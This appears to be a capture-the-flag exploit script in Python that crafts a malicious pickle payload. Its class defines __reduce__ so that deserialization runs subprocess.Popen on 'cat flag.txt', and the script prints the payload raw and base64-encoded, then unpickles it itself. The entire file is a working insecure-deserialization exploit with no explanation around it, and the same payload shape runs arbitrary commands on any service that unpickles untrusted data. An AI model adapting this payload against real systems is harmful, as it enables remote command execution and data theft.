import os
import subprocess
import pickle
import base64

class Test(object):
    def __reduce__(self):
        return (subprocess.Popen, (('cat', 'flag.txt'),))

def serialize_exploit():
    shellcode = pickle.dumps(Test())
    return shellcode

def insecure_deserialize(exploit_code):
    pickle.loads(exploit_code)

if __name__ == '__main__':
    shellcode = serialize_exploit()
    print(shellcode)
    print(base64.b64encode(shellcode)) ### ROT13 this!!!
    insecure_deserialize(shellcode)
